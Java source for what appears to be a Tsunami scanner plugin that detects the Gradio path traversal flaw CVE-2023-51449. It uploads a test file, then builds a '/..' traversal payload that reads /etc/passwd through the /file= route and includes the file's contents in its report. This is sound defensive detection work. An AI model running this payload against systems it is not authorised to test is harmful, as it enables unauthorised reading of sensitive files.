/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202351449;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.auto.value.AutoValue;
import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonElement;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.nio.file.Path;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import javax.inject.Inject;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okio.Buffer;

/** A {@link VulnDetector} that detects the CVE-2023-51449 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE202351449VulnDetector",
    version = "0.1",
    description = Cve202351449VulnDetector.VULN_DESCRIPTION,
    author = "Vasilii Ermilov (https://github.com/inkz)",
    bootstrapModule = Cve202351449DetectorBootstrapModule.class)
public final class Cve202351449VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "Gradio versions < 4.11.0 contain a vulnerability in the `/file` route which makes those"
          + " versions of the application susceptible to file traversal attacks in which an"
          + " attacker can access arbitrary files on a machine running a Gradio app with a public"
          + " URL.";

  private static final String POST_UPLOAD_PATH = "upload";
  private static final String GET_FILE_PATH = "file=";

  @VisibleForTesting static final String DETECTION_STRING = "root:x:0:0:root";

  private final HttpClient httpClient;

  private final Clock utcClock;

  @Inject
  Cve202351449VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.isWebService(networkService)
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("https://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  private HttpResponse sendUploadRequest(NetworkService networkService) throws IOException {
    String uploadUrl = buildTarget(networkService).append(POST_UPLOAD_PATH).toString();
    MultipartBody fileRequest =
        new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart(
                "files",
                "tsunami_gradio_test.txt",
                RequestBody.create(MediaType.parse("text/plain"), "Hello world"))
            .build();
    Buffer fileBuffer = new Buffer();
    fileRequest.writeTo(fileBuffer);

    return httpClient.send(
        post(uploadUrl)
            .setHeaders(
                HttpHeaders.builder()
                    .addHeader(CONTENT_TYPE, fileRequest.contentType().toString())
                    .addHeader(USER_AGENT, "Tsunami Scanner")
                    .build())
            .setRequestBody(ByteString.copyFrom(fileBuffer.readByteArray()))
            .build(),
        networkService);
  }

  private String producePathTravesalPayload(String tmpFile) {
    Path tmpFilePath = Path.of(tmpFile);
    Path parentDir = tmpFilePath.getParent();
    int subdirCount = parentDir.getNameCount();
    StringBuilder payloadBuilder = new StringBuilder();
    payloadBuilder.append(parentDir.toString());
    for (int i = 0; i < subdirCount; i++) {
      payloadBuilder.append("/..");
    }
    payloadBuilder.append("/etc/passwd");

    return payloadBuilder.toString();
  }

  private HttpResponse sendGetFileRequest(NetworkService networkService, String payload)
      throws IOException {
    String fetchFileUrl = buildTarget(networkService).append(GET_FILE_PATH).toString() + payload;
    return httpClient.sendAsIs(
        HttpRequest.get(fetchFileUrl)
            .setHeaders(HttpHeaders.builder().addHeader(USER_AGENT, "Tsunami Scanner").build())
            .build());
  }

  private DetectionResult getDetectionResult(NetworkService networkService) {
    try {
      logger.atInfo().log("Attempting to upload a temporary file");
      HttpResponse uploadResponse = sendUploadRequest(networkService);
      if (uploadResponse.status().code() != HttpStatus.OK.code()) {
        return DetectionResult.invulnerableForNetworkService(networkService);
      }

      JsonElement json = uploadResponse.bodyJson().get();
      String tmpFile = json.getAsJsonArray().get(0).getAsString();
      String ptPayload = producePathTravesalPayload(tmpFile);

      logger.atInfo().log("Attempting to fetch arbitrary file");
      HttpResponse getFileResponse = sendGetFileRequest(networkService, ptPayload);
      String body = getFileResponse.bodyString().get();
      if (getFileResponse.status().code() == HttpStatus.OK.code()
          && body.contains(DETECTION_STRING)) {
        return DetectionResult.builder()
            .setIsVulnerable(true)
            .setNetworkService(networkService)
            .setFetchedFileContent(body)
            .build();
      }

      return DetectionResult.invulnerableForNetworkService(networkService);
    } catch (IOException e) {
      return DetectionResult.invulnerableForNetworkService(networkService);
    } catch (RuntimeException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return DetectionResult.invulnerableForNetworkService(networkService);
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, DetectionResult detectionResult) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(detectionResult.networkService())
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_51449"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-51449 Gradio File Traversal Vulnerability")
                .setRecommendation("Update the Gradio instances to version 4.11.0 or later.")
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-51449"))
                .setDescription(VULN_DESCRIPTION)
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setDescription("Contents of /etc/passwd")
                        .setTextData(
                            TextData.newBuilder()
                                .setText(detectionResult.fetchedFileContent().get()))))
        .build();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-51449 starts detecting");
    DetectionReportList detectionReportList =
        DetectionReportList.newBuilder()
            .addAllDetectionReports(
                matchedServices.stream()
                    .filter(Cve202351449VulnDetector::isWebServiceOrUnknownService)
                    .map(this::getDetectionResult)
                    .filter(DetectionResult::isVulnerable)
                    .map(result -> buildDetectionReport(targetInfo, result))
                    .collect(toImmutableList()))
            .build();
    return detectionReportList;
  }

  @AutoValue
  abstract static class DetectionResult {
    abstract boolean isVulnerable();

    abstract NetworkService networkService();

    abstract Optional<String> fetchedFileContent();

    static Builder builder() {
      return new AutoValue_Cve202351449VulnDetector_DetectionResult.Builder();
    }

    static DetectionResult invulnerableForNetworkService(NetworkService networkService) {
      return builder().setIsVulnerable(false).setNetworkService(networkService).build();
    }

    @AutoValue.Builder
    abstract static class Builder {
      abstract Builder setIsVulnerable(boolean value);

      abstract Builder setNetworkService(NetworkService value);

      abstract Builder setFetchedFileContent(String value);

      abstract DetectionResult build();
    }
  }
}
